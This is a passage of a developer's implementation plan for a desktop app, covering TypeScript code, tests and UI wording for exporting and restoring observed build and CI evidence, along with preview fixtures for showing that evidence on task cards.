    readonly project: string
    readonly seats: readonly unknown[]
    readonly facts: readonly unknown[]
    /** Lines the exporting build could not read — a newer build's, or damaged — left out, and counted so the export says so. */
    readonly unreadable?: number
  }[]
```

2. In `interface BackupReport`, after `seating`, add:

```ts
  /**
   * Evidence and Seat records, counted by what became of each: `duplicate` was
   * already here; `refused` could not be read, or asked for what a backup may
   * not do here — close a Seat this desk kept, dress a conversation this desk
   * seated, stand for a project it does not belong to, or go past a limit;
   * `failed` could not be written.
   */
  readonly evidence: {
    readonly restored: number
    readonly duplicate: number
    readonly refused: number
    readonly failed: number
  }
```

`backup/import`'s validator (`shape({ backup: isObject })`) is unchanged: the host reads every field of a backup defensively, and `restore` below reads every line through `lineOf`.

- [ ] **Step 5: The plane exports and restores its stores**

In `packages/server/src/evidence/plane.ts`:

1. Add `import { isAbsolute, normalize } from 'node:path'` as the first import, followed by a blank line; add `BackupFile,` to the type import from `@harnessdesk/protocol`; replace `import { mintId } from './records.js'` with:

```ts
import { idOfLine, LINE_LIMIT, lineOf, LINE_VERSION, mintId, type StoreFile, type StoredLine } from './records.js'
```

   and `import { EvidenceStore } from './store.js'` with `import { EvidenceStore, type Admit } from './store.js'`.

2. Add above `close()`:

```ts
  /**
   * Every project's store, for a backup: each line this build can read, as it
   * is written, and how many it could not — left out, and counted, so an
   * export says it is not whole. Never the commands this machine approved
   * (`seen.ts`), nor its key.
   */
  async backup(): Promise<NonNullable<BackupFile['evidence']>> {
    const out: { project: string; seats: unknown[]; facts: unknown[]; unreadable: number }[] = []
    for (const project of await this.store.projects()) {
      const written = (line: StoredLine): unknown => ({ v: LINE_VERSION, ...line })
      const seats = await this.store.read(project, 'seats')
      const facts = await this.store.read(project, 'evidence')
      out.push({
        project,
        seats: seats.lines.map(written),
        facts: facts.lines.map(written),
        unreadable: seats.skipped + facts.skipped,
      })
    }
    return out
  }

  /**
   * Adds a backup's records to this desk's stores, and counts what became of
   * each. Additive, as every restore is, and **what this desk wrote wins**:
   *
   * - Every line is read by the one rule the store reads with (`lineOf`, where
   *   it is going), and past `RESTORE_PROJECT_LIMIT` projects or
   *   `RESTORE_LINE_LIMIT` lines, or a line over `LINE_LIMIT`, nothing is read.
   * - A record already here, by id, is a duplicate, and left as it is.
   * - A restored record is marked `restored`, and stays history: a restored
   *   fact stands as unknown until the desk observes the question itself, and
   *   never makes a card *Ready*; a restored Seat never says which Agent a
   *   conversation here is (`seatedAs` reads only Seats this desk kept).
   * - A Seat is refused for a conversation this desk already keeps a Seat for.
   * - A closing is admitted only for a Seat opened in the same entry of the
   *   same backup and restored beside it: a backup can never close a Seat this
   *   desk kept.
   *
   * Each file is read, judged and appended as one queued step of the store's
   * (`merge`), so two restores at once cannot both add a record. One line, or
   * one project, that cannot be restored never stops the rest.
   */
  async restore(entries: unknown): Promise<{
    readonly restored: number
    readonly duplicate: number
    readonly refused: number
    readonly failed: number
  }> {
    const count = { restored: 0, duplicate: 0, refused: 0, failed: 0 }
    const at = this.#now()
    let budget = RESTORE_LINE_LIMIT
    const list = Array.isArray(entries) ? entries : []
    for (const [index, entry] of list.entries()) {
      const one = (entry ?? {}) as { project?: unknown; seats?: unknown; facts?: unknown }
      const seats = Array.isArray(one.seats) ? one.seats : []
      const facts = Array.isArray(one.facts) ? one.facts : []
      const project = one.project
      if (
        index >= RESTORE_PROJECT_LIMIT ||
        typeof project !== 'string' ||
        !isAbsolute(project) ||
        normalize(project) !== project ||
        project.length > 4_096
      ) {
        count.refused += seats.length + facts.length
        continue
      }
      // The openings this entry brings: a closing is admitted beside its own opening, and no other.
      const opened = new Set<string>()
      for (const [file, raw] of [['seats', seats], ['evidence', facts]] as const) {
        const lines: StoredLine[] = []
        for (const value of raw) {
          if (budget <= 0) {
            count.refused += 1
            continue
          }
          budget -= 1
          const line = readRestored(value, { file, project })
          if (!line) {
            count.refused += 1
            continue
          }
          if (line.type === 'seat') opened.add(line.record.id)
          lines.push(markRestored(line, at))
        }
        try {
          const merged = await this.store.merge(project, file, lines, admitRestored(opened))
          count.restored += merged.added
          count.duplicate += merged.duplicate
          count.refused += merged.refused
        } catch (error) {
          count.failed += lines.length
          this.#port.log("a project's records from a backup could not be restored", {
            project,
            file,
            error: error instanceof Error ? error.message : String(error),
          })
        }
      }
    }
    if (count.refused > 0 || count.failed > 0) this.#port.log('a backup was restored in part', { ...count })
    if (count.restored > 0) await this.seats.load()
    return count
  }
```

3. At the end of the file, after the class, add the limits and the three rules a restored line is held to:

```ts
/** The most projects, and lines across them, one restore reads; the rest are refused and counted. */
export const RESTORE_PROJECT_LIMIT = 200
export const RESTORE_LINE_LIMIT = 100_000

/** A backup's line, read by the store's own rule for where it is going — and refused whole when it is over the line limit. */
const readRestored = (value: unknown, where: { readonly file: StoreFile; readonly project: string }): StoredLine | null => {
  let size: number
  try {
    size = Buffer.byteLength(JSON.stringify(value) ?? '')
  } catch {
    return null
  }
  return size > LINE_LIMIT ? null : lineOf(value, where)
}

/** A restored line carries when it came, or keeps the mark it came with: it was never observed here. */
const markRestored = (line: StoredLine, at: number): StoredLine => {
  if (line.type === 'seat') return { type: 'seat', record: { ...line.record, restored: line.record.restored ?? { at } } }
  if (line.type === 'evidence') return { type: 'evidence', record: { ...line.record, restored: line.record.restored ?? { at } } }
  return line
}

/** What a backup may add to a file here: nothing already here, no Seat for a conversation this desk seated, no closing but its own. */
const admitRestored =
  (opened: ReadonlySet<string>): Admit =>
  (line, here, added) => {
    const all = [...here, ...added]
    if (all.some((one) => idOfLine(one) === idOfLine(line))) return 'duplicate'
    if (line.type === 'seat') {
      const { runtime, sessionId } = line.record.session
      const kept = here.some(
        (one) =>
          one.type === 'seat' &&
          !one.record.restored &&
          one.record.session.runtime === runtime &&
          one.record.session.sessionId === sessionId,
      )
      return kept ? 'refused' : 'add'
    }
    if (line.type === 'seat-closed') {
      if (!opened.has(line.closing.seat)) return 'refused'
      const opening = all.find((one) => one.type === 'seat' && one.record.id === line.closing.seat)
      return opening?.type === 'seat' && opening.record.restored ? 'add' : 'refused'
    }
    return 'add'
  }
```

- [ ] **Step 6: The host carries them, after phase 2's stores**

In `packages/server/src/host.ts`:

1. In `#backupExport`, after `seating: await this.#machineSeating.raw(),`, add `evidence: await this.#evidence.backup(),`.
2. In `#backupImport`, replace

```ts
    this.#logger.info('backup restored', { agents, preferences, transcripts, agentFolders, seating })
    return { agents, preferences, transcripts, agentFolders, seating }
```

   with

```ts
    // What the desk observed, and every Seat it kept: history, never over what this desk wrote.
    const evidence = await this.#evidence.restore(file.evidence)
    this.#logger.info('backup restored', { agents, preferences, transcripts, agentFolders, seating, evidence })
    return { agents, preferences, transcripts, agentFolders, seating, evidence }
```

- [ ] **Step 7: General › Backup counts them**

1. Create `packages/ui/src/lib/backup-words.ts`:

```ts
import type { BackupFile, BackupReport } from '@harnessdesk/protocol'

/**
 * What General › Backup says after an export or a restore: every store it
 * carried, counted, each with its noun — never a field name. Kept apart from
 * the rows that say it so each sentence can be read without a screen.
 *
 * Nothing is counted as something it is not. An export that left lines out —
 * ones this build could not read — says so. A restore says apart what was
 * already here, what it refused — a record it could not read, or one a backup
 * may not write here — and what could not be written.
 */

/** "1 runtime", "3 runtimes" — a count and its noun, the noun's plural by adding an s. */
export const count = (n: number, noun: string): string => `${n} ${n === 1 ? noun : `${noun}s`}`

/** Every Seat and fact a backup carries, counted as the lines its stores hold. */
const recordsIn = (backup: BackupFile): number =>
  (backup.evidence ?? []).reduce((sum, one) => sum + one.seats.length + one.facts.length, 0)

/** The lines its stores held that the exporting build could not read, and so left out. */
const unreadableIn = (backup: BackupFile): number =>
  (backup.evidence ?? []).reduce((sum, one) => sum + (one.unreadable ?? 0), 0)

export const exportedSentence = (backup: BackupFile): string => {
  const left = unreadableIn(backup)
  return `Exported ${count(backup.agents.length, 'runtime')}, ${count(backup.agentFolders?.length ?? 0, 'Agent')} of yours, ${count(backup.transcripts.length, 'conversation')} and ${count(recordsIn(backup), 'record')} of what the desk observed.${left > 0 ? ` ${count(left, 'record')} this build cannot read ${left === 1 ? 'was' : 'were'} left out.` : ''}`
}

export const restoredSentence = (report: BackupReport): string => {
  const here =
    report.agents.skipped + report.transcripts.skipped + report.agentFolders.skipped + report.evidence.duplicate
  const { refused, failed } = report.evidence
  return `Restored ${count(report.agents.restored, 'runtime')}, ${count(report.agentFolders.restored, 'Agent')}, ${count(report.seating.restored, 'seat choice')}, ${count(report.preferences, 'preference')}, ${count(report.transcripts.restored, 'conversation')} and ${count(report.evidence.restored, 'record')} of what the desk observed.${here > 0 ? ` ${here} already here or newer, left alone.` : ''}${refused > 0 ? ` ${count(refused, 'record')} refused: this desk could not read ${refused === 1 ? 'it' : 'them'}, or a backup may not write ${refused === 1 ? 'it' : 'them'} here.` : ''}${failed > 0 ? ` ${count(failed, 'record')} could not be written.` : ''}`
}
```

2. In `packages/ui/src/components/Settings.tsx`:
   - Delete phase 2's `count` helper above `BackupRows` and its comment — it moves into `backup-words.ts` unchanged — and add `import { exportedSentence, restoredSentence } from '../lib/backup-words'` beside the other `../lib/` imports.
   - In `exportBackup`, replace the `setOutcome(…)` call with `setOutcome(exportedSentence(backup))`.
   - In `restoreBackup`, replace the `const skipped = …` line and the `setOutcome(…)` call after it with `setOutcome(restoredSentence(report))`.
   - Replace the backup row's `desc` with `desc="Runtimes, your Agents and their seats on this Mac, preferences, transcripts and what the desk observed, in one file — sign in again after restoring."`

This adds no surface: the same two rows say more. No preview fixture changes; `pnpm verify` runs the design audit over it.

- [ ] **Step 8: Run the tests to see them pass**

Run: `pnpm run build:node && node --test --test-reporter=spec packages/server/dist/test/evidence-backup.test.js packages/server/dist/test/backup.test.js`
Expected: PASS — 8 tests, and every test in `backup.test.js`.

Run: `pnpm --filter @harnessdesk/ui exec vitest run src/lib/backup-words.test.ts`
Expected: PASS — 5 tests.

- [ ] **Step 9: Prove the tests can fail**

Run each, watch the named test go red, and restore:

1. In `admitRestored`, replace the `seat-closed` branch with `return 'add'`: `a backup can never close, replace or outrank a Seat this desk kept` fails — the kept Seat was closed.
2. In `admitRestored`, change `return kept ? 'refused' : 'add'` to `return 'add'`: the same test fails on the forged Seat for the kept conversation.
3. In `markRestored`, return `line` for evidence: `a backup carries every Seat and every fact, and a restore on another desk adds them once, as history` fails on `a fact from a backup was not observed here`.
4. In `restore`, change `index >= RESTORE_PROJECT_LIMIT ||` to `false ||`, or `if (budget <= 0) {` to `if (false) {`: `a restore reads no more than its limits…` fails.
5. In `EvidenceStore.merge` (Task 2), run the step outside the queue: `two restores at once add each record once` fails — each wrote the lines.
6. In `lineOf` (Task 2), drop the file check in the `seat` case: `one bad record never stops the rest…` fails — the Seat filed with the facts was written there.
7. The approved-command test is a pin, so prove it observes: directly above its `await b.host.call('backup/import', { backup: forged })`, add `await new CommandsSeen(join(b.stateDir, SEEN_FILE)).approve(scope, { name: 'verify', run: 'pnpm verify' })`. It fails on its last assertion. Remove it.
8. In `EvidencePlane.seatedAs` (Task 6), read `latestOf` instead of `latestKeptOf`: `a Seat a backup brought never says which Agent a conversation on this desk is` fails — the conversation opened on the second desk wears Scout.
9. In `restoredSentence`, drop `+ report.evidence.duplicate`: `what was already here is counted once, evidence included` fails; drop the `refused` clause: `what a restore refused and what it could not write are said apart…` fails; in `exportedSentence`, drop the `left` clause: `an export that left out lines it could not read says so` fails.

- [ ] **Step 10: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/protocol/src/wire.ts packages/server/src/evidence/plane.ts packages/server/src/host.ts packages/ui/src/lib/backup-words.ts packages/ui/src/lib/backup-words.test.ts packages/ui/src/components/Settings.tsx packages/server/test/evidence-backup.test.ts packages/server/test/backup.test.ts
git commit -m "feat(evidence): a backup carries what the desk observed and every Seat

Export carries each project's evidence store, line for line, and counts the
lines it could not read and left out. Restore adds them by the store's own
reading rule, where each is going, as history: every restored record is
marked, a restored fact is unknown until this desk observes it, a restored
Seat never dresses a conversation here, and a backup can never close, replace
or outrank a Seat this desk kept. Each file is read, judged and appended as
one queued step, the restore is bounded in projects and lines, and it counts
what it restored, found already here, refused and could not write — never
stopping for one bad record. What a person approved stays on this machine: no
backup carries it, and nothing in one can approve a command. backup.test.ts's
pinned key list gains evidence.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit. Part A is complete: `pnpm verify` is green and every new verb is pinned in `UNREACHED`.

---

# Part B — the interface

Part B is stacked on Part A's branch and written against phase 2's Part B as merged. It also needs **the design system's state vocabulary: `4382ded9` from `claude/ui-roles` — cherry-pick it, or the roles PR once it is on main.** That commit gives, and this plan uses exactly:

- `Chip` with `tone?: Tone` — the system's set, `'neutral' | 'brand' | 'success' | 'warning' | 'danger' | 'info'` — plus `stale?: boolean` and `unknown?: boolean`. **Exactly one of `state` or `tone`** (`ChipProps` is a union); the words come from `children` or `label`. `stale` strikes the words through and is never drawn in the success tone; `unknown` is neutral.
- `stateTone(state) → { label, tone }` for `'open' | 'draft' | 'merged' | 'closed' | 'passed' | 'failed' | 'running' | 'skipped' | 'timed out'`, which `StatePill` reads. An outcome outside that list — CI that was cancelled, a check that never started — is said in words and drawn neutral; no state is invented for it.
- `<Board derived>`: `data-derived`, no add slot drawn whatever a column is passed, and an empty column says *Nothing here*. Columns learn the mode from context.
- `MenuItem disabled="reason"`: the reason is the item's second line, tied to it with `aria-describedby`.

Tasks 15 (the outcomes `lib/evidence.ts` names), 16 (`Chip`, `stateTone`), 17 (`MenuItem disabled`) and 19 (`Board derived`) name it as their prerequisite; Task 16's first step confirms every part of it, and Task 19's the derived board again. Each task that adds a surface adds its preview fixture, and runs `pnpm design:audit --strict` and `pnpm test:ui-system` before its commit; `pnpm verify` runs the audit too.

**How Part B was proven before it was written down.** Its code and tests were run against a scratch copy of the tree above with `4382ded9` applied — its Menu hunk by hand, the scratch base being older than `66f4d354` — and one stand-in for what does not exist yet: phase 2's `lib/agents.ts` (`ceilingWords`, `originWords`, `passedWords`, as phase 2's Tasks 12 and 18 write them). The whole UI suite passed there (225 files, 2,705 tests), the UI typecheck, `node script/design-audit.mjs --strict`, `node script/check-layering.mjs`, `node script/check-ui-system.mjs`, `node script/check-reachable.mjs` and `node script/check-secrets.mjs` passed, the new real-browser spec (`e2e/ui-system/run-check.spec.ts`, Task 17) passed under Playwright on a scratch port, and every named mutation below — thirty in this revision, the question's arming and its unfocused open among them — went red. Three things were **not** run: the rest of `pnpm test:ui-system` (it serves the preview on a fixed port another session may be using), Task 21's insertion into phase 2's `ProjectPage.tsx` and its test (neither exists yet), and Task 23's rig (it launches the app). Each of those tasks runs them.

---

### Task 15: Evidence in the renderer

> **Prerequisite:** `4382ded9` from `claude/ui-roles` (cherry-pick it, or the roles PR once it is on main) — `FactOutcome` below is held to its `stateTone` states in Task 16.

What the desk observed reaches the renderer the way flow runs do: pushed whole per room (`evidence/changed`) and read on demand (`loadBoardEvidence`), kept beside the board in the snapshot, and put into words in one place — `lib/evidence.ts` — so every surface says a fact the same way. Only a current fact is ever a verdict — fresh, or final (a merged pull request whose branch is gone): a stale one says how far behind it is, an unknown one says it cannot tell. Nothing here reads a message, a note or an outcome.

A chip names its fact's outcome in the design system's own states (`FactOutcome`: open, merged, closed, passed, failed, running, skipped, timed out) and nothing else; CI that was cancelled is its own verdict — never a pass, and ranked after a failure but before anything still running — and is said in words, as a check that never started is. `stale` and `unknown` are the `Chip`'s own, so no colour is chosen here.

**A late answer never moves a card back.** A poll, a window coming to the front, and a push can cross: a poll that began before a check ended can answer after the push that told of its fact. Each answer carries the host's stamp for when its read began (Task 10), and the store keeps a room's evidence only when it is at least as new as what is drawn.

**Files:**
- Create: `packages/ui/src/lib/evidence.ts`, `packages/ui/src/preview/evidence-fixture.ts`
- Modify: `packages/ui/src/state/snapshot.ts` (`boardEvidence`), `packages/ui/src/state/store.ts` (`evidence/changed`; `team/removed` drops a room's evidence; `loadBoardEvidence`)
- Modify: `packages/ui/src/preview/harness.tsx` (the evidence room, its evidence, `loadBoardEvidence`)
- Modify: `script/check-reachable.mjs` (unpin `evidence/board`: `loadBoardEvidence` calls it)
- Test: `packages/ui/src/lib/evidence.test.ts`, `packages/ui/src/state/store.evidence.test.ts` (new)

**Proof needs:** neither

**Interfaces:**
- Consumes: `BoardEvidence`, `CardEvidence`, `EvidenceView`, `Freshness`, `SeatRecord`, `ProjectChecks`, `CheckUnseen` (`@harnessdesk/protocol`, Part A); `evidence/board`, `evidence/changed` (Task 10).
- Produces: `AppSnapshot.boardEvidence: ReadonlyMap<string, BoardEvidence>`; `AppStore.loadBoardEvidence(room): Promise<void>` (and the private `#keepBoardEvidence`, which keeps the newest by stamp). From `lib/evidence.ts`: `shortSha`, `isStale`, `isCurrent`, `sinceWords`, `standingWords`, `checkPassed`, `checkWords`, `type CiVerdict` (`passed`, `failed`, `cancelled`, `running`, `skipped`), `ciVerdict`, `revisionOfFact`, `byWords`, `type FactOutcome`, `interface FactChip { key; label; outcome: FactOutcome | null; stale; unknown }`, `spokenChip(chip)`, `chipOf(view)`, `cardChips(card)`. From `preview/evidence-fixture.ts`: `EVIDENCE_ROOM`, `FRESH`, `HEAD`, `BASE`, `factView`, `checkView`, `ciView`, `prView`, `diffView`, `cardEvidence`, `EVIDENCE_TEAM`, `EVIDENCE_BOARD`, `PREVIEW_SEAT`, `PREVIEW_CHECKS`, `PREVIEW_UNSEEN` — the preview's fixtures, and the builders every later test uses.

- [ ] **Step 1: Confirm the anchors phase 2 left**

Run: `grep -n "readonly flowRuns\|flowRuns: new Map()" packages/ui/src/state/snapshot.ts; grep -n "method === 'flow/changed'\|method === 'team/removed'\|async loadFlowRuns" packages/ui/src/state/store.ts`
Expected: the `flowRuns` field and its `EMPTY` entry; the two notification branches; `loadFlowRuns`. Phase 2 adds fields after `flowRuns` and handlers elsewhere in the switch; each edit below is anchored on these lines alone.

- [ ] **Step 2: The fixtures the preview and the tests share**

Create `packages/ui/src/preview/evidence-fixture.ts`:

```ts
import {
  runtimeId,
  sessionKey,
  type BoardEvidence,
  type CardEvidence,
  type CheckRun,
  type CheckUnseen,
  type Evidence,
  type EvidenceView,
  type Freshness,
  type Intent,
  type ProjectChecks,
  type SeatRecord,
  type SessionId,
  type TeamState,
} from '@harnessdesk/protocol'

import { PREVIEW_ROOT } from './sidebar-fixture'

/**
 * What the desk observed, in the shapes the host sends: facts on cards, a
 * board whose columns they make, a Seat record, a project's checks, and the
 * question a command nobody has seen here asks.
 *
 * Typed as the protocol's own results, so a fixture that stopped matching what
 * the host sends stops compiling. The preview draws every surface of the
 * evidence phase from these, and the tests build their facts with the same
 * builders — so a surface is judged on the shapes it will actually be given.
 * Nothing here names a real runtime: the seats are Alpha and Beta, as they are
 * everywhere else in the preview.
 */

/** The room the preview's evidence board is, and every fact below is on. */
export const EVIDENCE_ROOM = 'room-evidence'

export const FRESH: Freshness = { state: 'fresh' }

/** A full commit name, from a short one: the rest is padding a reader never sees. */
const sha = (short: string): string => short.padEnd(40, '0')

export const HEAD = sha('a1b2c3d')
export const BASE = sha('0f1e2d3')

let minted = 0

/** One fact on a card, as `evidence/board` sends it: produced by Scout on the Alpha seat unless said. */
export const factView = (
  fact: Evidence,
  over: {
    readonly freshness?: Freshness
    readonly card?: number
    readonly by?: EvidenceView['by']
    readonly round?: number | null
    readonly observedAt?: number
  } = {},
): EvidenceView => {
  minted += 1
  return {
    record: {
      id: `fact-${minted}`,
      fact,
      card: { board: EVIDENCE_ROOM, id: over.card ?? 1 },
      checkout: { cwd: PREVIEW_ROOT, branch: 'retry-on-502' },
      seat: over.by === null ? null : 'seat-1',
      round: over.round ?? null,
      observedAt: over.observedAt ?? Date.UTC(2026, 8, 18, 14, 5),
      posted: null,
    },
    freshness: over.freshness ?? FRESH,
    by: over.by === undefined ? { agent: 'Scout', seat: 'Alpha · alpha-max' } : over.by,
  }
}

/** A named check's fact: `verify` passing at HEAD unless said. */
export const checkView = (
  over: {
    readonly name?: string
    readonly exit?: number | null
    readonly timedOut?: boolean
    readonly at?: string
    readonly tail?: string
    readonly run?: string
    readonly freshness?: Freshness
    readonly card?: number
  } = {},
): EvidenceView =>
  factView(
    {
      kind: 'check',
      name: over.name ?? 'verify',
      run: over.run ?? 'pnpm verify',
      exit: over.exit === undefined ? 0 : over.exit,
      timedOut: over.timedOut ?? false,
      at: over.at ?? HEAD,
      dirty: over.freshness?.state === 'uncommitted',
      tail: over.tail ?? '',
    },
    { ...(over.freshness ? { freshness: over.freshness } : {}), ...(over.card ? { card: over.card } : {}) },
  )

/** The forge's checks on the pull request's head. */
export const ciView = (states: readonly CheckRun['state'][], over: { readonly freshness?: Freshness; readonly card?: number } = {}): EvidenceView =>
  factView(
    {
      kind: 'ci',
      checks: states.map((state, n) => ({ name: ['build', 'lint', 'e2e', 'docs'][n] ?? `check ${n}`, state, url: null })),
      at: HEAD,
    },
    { ...over, by: null },
  )

/** The branch's pull request. */
export const prView = (
  state: 'open' | 'merged' | 'closed',
  over: { readonly number?: number; readonly freshness?: Freshness; readonly card?: number } = {},
): EvidenceView =>
  factView(
    { kind: 'pr', number: over.number ?? 12, head: HEAD, state, url: 'https://example.com/storefront/pull/12' },
    { ...(over.freshness ? { freshness: over.freshness } : {}), ...(over.card ? { card: over.card } : {}), by: null },
  )

/** The branch's diff against where it started. */
export const diffView = (over: { readonly freshness?: Freshness; readonly card?: number } = {}): EvidenceView =>
  factView({ kind: 'diff', files: 6, added: 120, removed: 30, from: BASE, to: HEAD }, over)

/** One card's evidence. */
export const cardEvidence = (
  card: number,
  facts: readonly EvidenceView[],
  running: CardEvidence['running'] = [],
): CardEvidence => ({ card, facts, running })

// ---------------------------------------------------------------- the board

const at = Date.UTC(2026, 8, 18, 13, 0)

const card = (id: number, title: string, over: Partial<Intent> = {}): Intent => ({
  id,
  title,
  detail: null,
  state: 'done',
  files: [],
  dependsOn: [],
  claim: null,
  blockedReason: null,
  handoff: null,
  note: null,
  createdAt: at,
  updatedAt: at,
  ...over,
})

/**
 * A board in every column the facts make. Card 6 was finished with a note
 * saying the tests pass, and the channel says so too — and it waits in
 * *Needs you*, because nobody observed a check. Card 7 was dropped, and is
 * set aside.
 */
export const EVIDENCE_TEAM: TeamState = {
  id: EVIDENCE_ROOM,
  name: 'Checkout hardening',
  updatedAt: at,
  root: PREVIEW_ROOT,
  members: [sessionKey(runtimeId('codex'), 'c1' as SessionId), sessionKey(runtimeId('claude'), 'k1' as SessionId)],
  messaging: true,
  intents: [
    card(1, 'Retry the checkout call on a 502'),
    card(2, 'Cap the backoff and add jitter'),
    card(3, 'Cover both in retry.test.ts'),
    card(4, 'Make the webhook receiver idempotent', {
      state: 'claimed',
      claim: { runtime: runtimeId('codex'), sessionId: 'c1', at },
    }),
    card(5, 'Decide the alert threshold for retry storms', { state: 'open' }),
    card(6, 'Tidy the retry logging', { note: 'Done — all tests pass.' }),
    card(7, 'Retry on a 429 as well', { state: 'abandoned', note: 'Not needed: the gateway retries these itself.' }),
  ],
  channel: [
    {
      id: 'claim-1',
      at,
      kind: 'message',
      from: { kind: 'agent', runtime: runtimeId('claude'), sessionId: 'k1', title: 'Auth refactor' },
      to: { runtime: runtimeId('codex'), sessionId: 'c1', title: 'API migration' },
      text: 'verify passed on #6, all tests pass — ready to merge.',
      state: 'delivered',
    },
  ],
  nicknames: {},
  plans: [],
}

export const EVIDENCE_BOARD: BoardEvidence = {
  room: EVIDENCE_ROOM,
  stamp: at,
  checks: ['verify', 'lint'],
  refused: [
    {
      name: 'e2e',
      why: 'The command holds a character that is not plain printable ASCII — a control character, an invisible one, or a letter that can pass for another. What runs has to be exactly what is shown, so it is not offered.',
    },
  ],
  unreadable: null,
  cards: [
    cardEvidence(1, [checkView({ card: 1 }), ciView(['passed', 'passed', 'skipped'], { card: 1 }), prView('open', { card: 1 }), diffView({ card: 1 })]),
    cardEvidence(2, [checkView({ card: 2, freshness: { state: 'behind', commits: 2 } }), diffView({ card: 2, freshness: { state: 'behind', commits: 2 } })]),
    cardEvidence(3, [prView('open', { number: 14, card: 3 })], [{ name: 'verify', since: at }]),
    cardEvidence(4, [diffView({ card: 4 })]),
  ],
}

// ------------------------------------------------------------ the Seat record

/** The Seat the preview's own conversation (`codex`, `s1`) was kept as. */
export const PREVIEW_SEAT: SeatRecord = {
  id: 'seat-1',
  agent: { id: 'scout', name: 'Scout', origin: 'project' },
  briefDigest: 'digest-1',
  seat: { runtime: 'codex', model: 'alpha-max' },
  seatLabel: 'Alpha · alpha-max',
  passedOver: [
    {
      seat: { runtime: 'claude' },
      label: 'Beta · beta-pro',
      runtimeName: 'Beta',
      state: 'passed',
      reason: null,
      fix: null,
    },
  ],
  standing: { kind: 'permission', permission: 'read' },
  ceiling: null,
  checkout: { cwd: PREVIEW_ROOT, project: PREVIEW_ROOT, branch: 'retry-on-502', head: HEAD },
  session: { runtime: 'codex', sessionId: 's1' },
  board: EVIDENCE_ROOM,
  role: null,
  openedAt: Date.UTC(2026, 8, 18, 12, 40),
  closed: null,
}

// ------------------------------------------------------- a project's checks

export const PREVIEW_CHECKS: ProjectChecks = {
  project: PREVIEW_ROOT,
  file: `${PREVIEW_ROOT}/.harnessdesk/checks.yml`,
  exists: true,
  at: HEAD,
  uncommitted: false,
  checks: [
    { name: 'verify', run: 'pnpm verify', timeout: 1200, seen: 'yes' },
    { name: 'lint', run: 'pnpm lint --max-warnings 0', timeout: 600, seen: 'changed' },
    { name: 'types', run: 'pnpm typecheck', timeout: 600, seen: 'no' },
  ],
  problems: [
    {
      at: 'e2e.run',
      check: 'e2e',
      text: 'The command holds a character that is not plain printable ASCII — a control character, an invisible one, or a letter that can pass for another. What runs has to be exactly what is shown, so it is not offered.',
    },
  ],
}

/** The question a changed command asks, as `evidence/check/run` refuses it. */
export const PREVIEW_UNSEEN: CheckUnseen = {
  check: { name: 'lint', run: 'pnpm lint --max-warnings 0', timeout: 600 },
  previous: 'pnpm lint',
  cwd: PREVIEW_ROOT,
  file: `${PREVIEW_ROOT}/.harnessdesk/checks.yml`,
  digest: sha('c4ec5f1'),
}
```

- [ ] **Step 3: Write the failing tests**

1. Create `packages/ui/src/lib/evidence.test.ts`:

```ts
import { describe, expect, it } from 'vitest'

import { cardEvidence, checkView, ciView, diffView, factView, prView } from '../preview/evidence-fixture'
import { byWords, cardChips, chipOf, ciVerdict, spokenChip, standingWords } from './evidence'

/*
 * What a fact says on its card. A chip reports an outcome only in the design
 * system's own states, and only a current fact is ever a verdict: a stale one
 * says how far behind it is and is struck through; an unknown one is drawn
 * neutral, and the dialog says why.
 */

const RUN = { name: 'verify', state: 'passed' as const, url: null }

describe('a fact, as its chip', () => {
  it('says what was observed, at which commit, and names its outcome in the system’s states', () => {
    expect(chipOf(checkView())).toEqual({ key: 'check:verify', label: 'verify ✓ @a1b2c3d', outcome: 'passed', stale: false, unknown: false })
    expect([chipOf(checkView({ exit: 1 })).label, chipOf(checkView({ exit: 1 })).outcome]).toEqual(['verify ✗ @a1b2c3d', 'failed'])
    expect([chipOf(checkView({ exit: null, timedOut: true })).label, chipOf(checkView({ exit: null, timedOut: true })).outcome]).toEqual(['verify timed out @a1b2c3d', 'timed out'])
    // An outcome the system has no state for is said in words, and names none.
    expect([chipOf(checkView({ exit: null })).label, chipOf(checkView({ exit: null })).outcome]).toEqual(['verify did not start @a1b2c3d', null])
    expect([chipOf(ciView(['passed', 'skipped'])).label, chipOf(ciView(['passed', 'skipped'])).outcome]).toEqual(['CI ✓', 'passed'])
    expect([chipOf(ciView(['passed', 'failed'])).label, chipOf(ciView(['passed', 'failed'])).outcome]).toEqual(['CI ✗', 'failed'])
    expect([chipOf(ciView(['passed', 'pending'])).label, chipOf(ciView(['passed', 'pending'])).outcome]).toEqual(['CI running', 'running'])
    expect([chipOf(ciView(['passed', 'cancelled'])).label, chipOf(ciView(['passed', 'cancelled'])).outcome]).toEqual(['CI cancelled', null])
    expect(['open', 'merged', 'closed'].map((state) => chipOf(prView(state as 'open')).outcome)).toEqual(['open', 'merged', 'closed'])
    expect([chipOf(diffView()).label, chipOf(diffView()).outcome]).toEqual(['+120 −30 in 6 files', null])
  })

  it('a stale fact says how far behind it is, and is marked stale for the chip to strike through', () => {
    const behind = chipOf(checkView({ freshness: { state: 'behind', commits: 2 } }))
    expect(behind).toEqual({ key: 'check:verify', label: 'verify ✓ @a1b2c3d — 2 commits since', outcome: 'passed', stale: true, unknown: false })
    expect(chipOf(checkView({ freshness: { state: 'moved' } })).label).toBe('verify ✓ @a1b2c3d — rewritten since')
    expect(spokenChip(behind)).toBe('verify ✓ @a1b2c3d — 2 commits since (stale)')
  })

  it('an unknown fact is not stale and not a verdict: it is marked unknown, and the dialog says why', () => {
    const view = checkView({ freshness: { state: 'unknown', why: 'it came from a backup, and this desk has not observed it' } })
    expect(chipOf(view)).toEqual({ key: 'check:verify', label: 'verify ✓ @a1b2c3d', outcome: 'passed', stale: false, unknown: true })
    expect(spokenChip(chipOf(view))).toBe('verify ✓ @a1b2c3d (unknown)')
    expect(standingWords(view.freshness)).toBe('Unknown: it came from a backup, and this desk has not observed it.')
  })

  it('a merged pull request whose branch is gone is final: current, and said so', () => {
    const final = prView('merged', { freshness: { state: 'final' } })
    expect(chipOf(final)).toEqual({ key: 'pr', label: 'PR #12 merged', outcome: 'merged', stale: false, unknown: false })
    expect(standingWords(final.freshness)).toBe('Final: the pull request was merged and its branch is gone, so nothing can land on it now.')
  })
})

describe('what CI says together', () => {
  it('a failure first; then a cancelled check, which is never a pass; then one still running', () => {
